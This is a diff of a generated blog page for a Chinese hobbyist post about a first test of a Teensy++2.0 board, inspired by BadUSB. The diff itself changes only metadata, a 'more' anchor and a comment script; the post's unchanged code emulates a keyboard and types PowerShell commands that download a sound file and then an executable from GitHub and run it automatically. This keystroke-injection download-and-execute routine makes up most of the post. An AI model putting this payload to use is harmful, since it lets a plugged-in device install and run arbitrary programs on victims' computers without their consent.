@@ -55,19 +55,19 @@
   };
 </script>
 
-  <meta name="description" content="头一次接触开发板，使用的是Teensy++2.0。源动力来自于BadUSB。 Teensy这是一个用于模拟键鼠主控的开发板，可以用作渗透或者其它等。 Arduino 和 Teensyduino自行安装。 实例测试环境为Win10，使用powershell。 使用开发板实现文件自动下载运行。 写入代码： 123456789101112131415161718192021222324252627282">
+  <meta name="description" content="头一次接触开发板，使用的是Teensy++2.0。源动力来自于BadUSB。 Teensy这是一个用于模拟键鼠主控的开发板，可以用作渗透或者其它等。 Arduino 和 Teensyduino自行安装。 实例测试环境为Win10，使用powershell。 使用开发板实现文件自动下载运行。">
 <meta name="keywords" content="C,Embedded">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Teensy2.0Test">
 <meta property="og:url" content="https://nanfengx.top/2019/01/28/Teensy2-0Test/index.html">
 <meta property="og:site_name" content="NanFengX">
-<meta property="og:description" content="头一次接触开发板，使用的是Teensy++2.0。源动力来自于BadUSB。 Teensy这是一个用于模拟键鼠主控的开发板，可以用作渗透或者其它等。 Arduino 和 Teensyduino自行安装。 实例测试环境为Win10，使用powershell。 使用开发板实现文件自动下载运行。 写入代码： 123456789101112131415161718192021222324252627282">
+<meta property="og:description" content="头一次接触开发板，使用的是Teensy++2.0。源动力来自于BadUSB。 Teensy这是一个用于模拟键鼠主控的开发板，可以用作渗透或者其它等。 Arduino 和 Teensyduino自行安装。 实例测试环境为Win10，使用powershell。 使用开发板实现文件自动下载运行。">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://nanfengx.top/pic/201901281.png">
-<meta property="og:updated_time" content="2019-08-13T14:57:29.981Z">
+<meta property="og:updated_time" content="2019-11-08T05:40:45.127Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Teensy2.0Test">
-<meta name="twitter:description" content="头一次接触开发板，使用的是Teensy++2.0。源动力来自于BadUSB。 Teensy这是一个用于模拟键鼠主控的开发板，可以用作渗透或者其它等。 Arduino 和 Teensyduino自行安装。 实例测试环境为Win10，使用powershell。 使用开发板实现文件自动下载运行。 写入代码： 123456789101112131415161718192021222324252627282">
+<meta name="twitter:description" content="头一次接触开发板，使用的是Teensy++2.0。源动力来自于BadUSB。 Teensy这是一个用于模拟键鼠主控的开发板，可以用作渗透或者其它等。 Arduino 和 Teensyduino自行安装。 实例测试环境为Win10，使用powershell。 使用开发板实现文件自动下载运行。">
 <meta name="twitter:image" content="https://nanfengx.top/pic/201901281.png">
   <link rel="canonical" href="https://nanfengx.top/2019/01/28/Teensy2-0Test/">
 
@@ -262,7 +262,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-08-13 22:57:29" itemprop="dateModified" datetime="2019-08-13T22:57:29+08:00">2019-08-13</time>
+                <time title="Modified: 2019-11-08 13:40:45" itemprop="dateModified" datetime="2019-11-08T13:40:45+08:00">2019-11-08</time>
               </span>
             
           
@@ -296,6 +296,8 @@
 <h2 id="Arduino-和-Teensyduino"><a href="#Arduino-和-Teensyduino" class="headerlink" title="Arduino 和 Teensyduino"></a>Arduino 和 Teensyduino</h2><p>自行安装。</p>
 <h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>测试环境为Win10，使用powershell。</p>
 <p>使用开发板实现文件自动下载运行。</p>
+<a id="more"></a>
+
 <p>写入代码：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123; </span><br><span class="line"></span><br><span class="line">   delay(<span class="number">5000</span>);<span class="comment">//延迟5000ms，便于调试和电脑处理</span></span><br><span class="line">   Keyboard.press(KEY_LEFT_CTRL);<span class="comment">//Press Ctrl</span></span><br><span class="line">   Keyboard.press(KEY_ESC);<span class="comment">//Press Esc</span></span><br><span class="line">   Keyboard.releaseAll();<span class="comment">//释放</span></span><br><span class="line">   delay(<span class="number">500</span>);</span><br><span class="line">   </span><br><span class="line">   delay(<span class="number">5000</span>);</span><br><span class="line">   Keyboard.print(<span class="string">"powershell $client = new-object System.Net.WebClient;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$client.DownloadFile('https://github.com/NanFengx/Teensy/raw/master/OnlyMyRailgunTest.wav', 'D:\\OnlyMyRailgunTest.wav');exit;"</span>);</span><br><span class="line"> </span><br><span class="line">   delay(<span class="number">5000</span>);</span><br><span class="line">   Keyboard.press(KEY_RETURN);</span><br><span class="line">   Keyboard.releaseAll();</span><br><span class="line"></span><br><span class="line">   delay(<span class="number">15000</span>);</span><br><span class="line">   Keyboard.press(KEY_LEFT_CTRL);</span><br><span class="line">   Keyboard.press(KEY_ESC);</span><br><span class="line">   Keyboard.releaseAll();</span><br><span class="line">   delay(<span class="number">500</span>);</span><br><span class="line">   </span><br><span class="line">   delay(<span class="number">5000</span>);</span><br><span class="line">   Keyboard.print(<span class="string">"powershell $client = new-object System.Net.WebClient;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$client.DownloadFile('https://github.com/NanFengx/Teensy/raw/master/Project1.exe', 'D:\\Project1.exe');start D:\\Project1.exe;"</span>);</span><br><span class="line">   Keyboard.press(KEY_RETURN);</span><br><span class="line">   Keyboard.releaseAll();</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   delay(<span class="number">30000</span>);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
 
@@ -367,7 +369,7 @@
     
   
   <div class="comments">
-  <script src="https://utteranc.es/client.js" repo="NanFengX/NanFengx.github.io" issue-term="null" theme="github-light" crossorigin="anonymous" async></script>
+  <script src="null" repo="NanFengX/NanFengx.github.io" issue-term="null" theme="github-light" crossorigin="anonymous" async></script>
   </div>
   
   
